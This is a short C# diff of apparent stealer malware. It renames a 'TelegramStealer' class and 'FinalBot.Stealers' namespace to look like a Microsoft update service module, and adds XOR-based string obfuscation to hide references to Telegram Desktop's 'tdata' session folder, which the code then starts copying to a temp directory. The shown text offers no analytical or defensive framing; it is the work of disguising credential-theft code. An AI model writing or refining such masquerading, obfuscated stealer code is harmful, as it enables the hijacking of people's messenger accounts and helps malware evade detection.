@@ -3,17 +3,24 @@ using System.IO;
 using System.Collections.Generic;
 using System.Linq;
 
-namespace FinalBot.Stealers
+namespace Microsoft.UpdateService.Modules
 {
-    public class TelegramStealer
+    public class MessengerService
     {
+        private static string D(string s)
+        {
+            char[] c = s.ToCharArray();
+            for (int i = 0; i < c.Length; i++) c[i] = (char)(c[i] ^ 0x05);
+            return new string(c);
+        }
+
         private readonly string _appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
 
         public string Run()
         {
             try
             {
-                string tdataPath = Path.Combine(_appData, "Telegram Desktop", "tdata");
+                string tdataPath = Path.Combine(_appData, D("Q`i`bwdh%A`vnqju"), D("qadqd")); // Telegram Desktop, tdata
                 if (!Directory.Exists(tdataPath)) return "❌ Telegram Desktop not found.";
 
                 string sessionDir = Path.Combine(Path.GetTempPath(), "TG_" + Guid.NewGuid().ToString().Substring(0, 8));
